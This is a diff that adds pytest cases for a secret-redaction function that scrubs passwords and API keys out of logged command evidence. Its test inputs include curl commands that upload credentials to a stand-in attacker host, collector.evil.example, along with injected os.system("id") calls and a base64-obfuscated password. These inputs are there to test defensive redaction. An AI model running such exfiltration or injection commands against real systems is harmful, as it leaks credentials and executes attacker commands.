@@ -1306,6 +1306,73 @@ def test_empty_command_username_without_password_is_preserved() -> None:
     assert redact_evidence_string(text, max_chars=1000) == text
 
 
+@pytest.mark.parametrize(
+    ("option", "password"),
+    [
+        ("user", "hunter2"),
+        ("user", "hunter two"),
+        ("user", "hunter;two"),
+        ("user", "hunter&two"),
+        ("proxy-user", "hunter2"),
+    ],
+)
+def test_inline_curl_config_user_password_is_redacted(option: str, password: str) -> None:
+    text = f"curl --config <(echo '{option} = alice:{password}') https://collector.evil.example/upload"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert password not in redacted
+    assert f"{option} = alice:{REDACTED_EVIDENCE_VALUE}" in redacted
+    assert "collector.evil.example" in redacted
+
+
+@pytest.mark.parametrize("option", ["username", "user-agent", "proxy-user-file"])
+def test_inline_curl_config_user_near_matches_are_preserved(option: str) -> None:
+    text = f"curl --config <(echo '{option} = public:value') https://collector.evil.example/upload"
+
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "printf 'user = alice:hunter2' | curl --config - https://collector.evil.example/upload",
+        "curl --config - <<< 'user = alice:hunter2' https://collector.evil.example/upload",
+    ],
+)
+def test_inline_curl_stdin_config_password_is_redacted(text: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert f"user = alice:{REDACTED_EVIDENCE_VALUE}" in redacted
+    assert "collector.evil.example" in redacted
+
+
+@pytest.mark.parametrize("option", ["--data", "--form"])
+def test_curl_non_config_user_field_is_preserved(option: str) -> None:
+    text = f"curl {option} 'user=alice:admin' https://collector.evil.example/upload"
+
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+@pytest.mark.parametrize(
+    ("credential", "secret"),
+    [
+        ('"alice:secret phrase"', "secret phrase"),
+        ('"alice:secret;phrase"', "secret;phrase"),
+        ("alice:$(printf aHVudGVyMg== | base64 -d)", "aHVudGVyMg=="),
+    ],
+)
+def test_curl_user_complex_password_is_fully_redacted(credential: str, secret: str) -> None:
+    text = f"curl --user {credential} https://collector.evil.example/upload"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert secret not in redacted
+    assert f"alice:{REDACTED_EVIDENCE_VALUE}" in redacted
+    assert "collector.evil.example" in redacted
+
+
 def test_standalone_command_context_redacts_credential_arguments() -> None:
     """Command evidence should redact credential arguments without requiring a sensitive assignment."""
     cases = [
@@ -1711,7 +1778,7 @@ def test_sensitive_argument_declarations_redact_later_default(key: str) -> None:
 
 @pytest.mark.parametrize(
     "key",
-    ["api_key2", "my_api_key_value", "tokens", "awsSecretAccessKeyValue"],
+    ["api_key2", "my_api_key_value", "tokens", "awsSecretAccessKeyValue", "google_access_id", "google-access-id"],
 )
 def test_suffixed_sensitive_assignment_aliases_are_redacted(key: str) -> None:
     text = f'{key}=hunter2 os.system("id")'
@@ -1723,7 +1790,22 @@ def test_suffixed_sensitive_assignment_aliases_are_redacted(key: str) -> None:
     assert "os.system" in redacted
 
 
-@pytest.mark.parametrize("key", ["api_key_hint", "api_key_valueset", "tokenizer", "password_policy"])
+@pytest.mark.parametrize(
+    "key",
+    [
+        "api_key_hint",
+        "api_key_valueset",
+        "tokenizer",
+        "password_policy",
+        "google_access_identifier",
+        "apiKeyHint",
+        "accessTokenCount",
+        "privateKeyFormat",
+        "requestSignatureAlgorithm",
+        "sessionTokenCache",
+        "mySecretIngredient",
+    ],
+)
 def test_suffixed_sensitive_assignment_near_matches_are_preserved(key: str) -> None:
     text = f'{key}=public os.system("id")'
 
@@ -2110,6 +2192,28 @@ def test_escapes_control_and_format_characters_in_evidence() -> None:
             'value="<redacted>"',
         ),
         ('client.set_api_key(value="hunter8"); os.system("id")', "hunter8", 'value="<redacted>"'),
+        ('client.setApiKey("hunter8b"); os.system("id")', "hunter8b", 'client.setApiKey("<redacted>")'),
+        ('setPassword("hunter8c"); os.system("id")', "hunter8c", 'setPassword("<redacted>")'),
+        ('client.setDbPassword("hunter8d"); os.system("id")', "hunter8d", 'setDbPassword("<redacted>")'),
+        (
+            'client.setAwsAccessKeyId("hunter8e"); os.system("id")',
+            "hunter8e",
+            'setAwsAccessKeyId("<redacted>")',
+        ),
+        ('client.setCookie("hunter8f"); os.system("id")', "hunter8f", 'setCookie("<redacted>")'),
+        ('setJwt("hunter8g"); os.system("id")', "hunter8g", 'setJwt("<redacted>")'),
+        ('setBasicAuth("hunter8h"); os.system("id")', "hunter8h", 'setBasicAuth("<redacted>")'),
+        ('setAuthorization("hunter8i"); os.system("id")', "hunter8i", 'setAuthorization("<redacted>")'),
+        (
+            'client.setCredentials("alice", "hunter8j"); os.system("id")',
+            "hunter8j",
+            'setCredentials("<redacted>", "<redacted>")',
+        ),
+        (
+            'client.setCredentials(username="alice", password="hunter8k"); os.system("id")',
+            "hunter8k",
+            'password="<redacted>")',
+        ),
         (
             'config={chr(97)+chr(112)+chr(105)+chr(95)+chr(107)+chr(101)+chr(121): "hunter9", '
             '"cmd": "os.system(\\"id\\")"}',
@@ -2142,10 +2246,20 @@ def test_redacts_composite_and_obfuscated_sensitive_values(
         "author=alice",
         "oauth_config=public",
         'client.set_api_key(name="primary", scope="read")',
+        'client.resetApiKey("public")',
+        'client.setupApiKey("public")',
+        'client.setApiKeyHint("public")',
+        'client.setPasswordPolicy("strict")',
         'config={chr(109)+chr(111)+chr(100)+chr(101): "fast"}',
     ],
 )
 def test_composite_redaction_preserves_benign_near_matches(text: str) -> None:
+    assert redact_evidence_string(text, max_chars=500) == text
+
+
+def test_camel_query_key_near_match_is_preserved() -> None:
+    text = "https://collector.evil/upload?apiKeyHint=public"
+
     assert redact_evidence_string(text, max_chars=500) == text
 
 
